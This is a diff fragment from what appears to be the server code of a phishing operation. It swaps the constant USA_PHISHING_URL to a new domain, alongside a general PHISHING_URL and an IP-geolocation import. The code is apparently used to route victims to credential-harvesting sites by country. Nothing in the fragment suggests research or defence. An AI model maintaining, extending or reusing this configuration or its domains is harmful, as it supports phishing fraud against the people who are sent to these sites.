@@ -9,7 +9,7 @@ const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
 const PHISHING_URL = "vetifyhub.cc";
-const USA_PHISHING_URL = "stirlaris.site";
+const USA_PHISHING_URL = "electofun.site";
 
 
 // CONFIGS
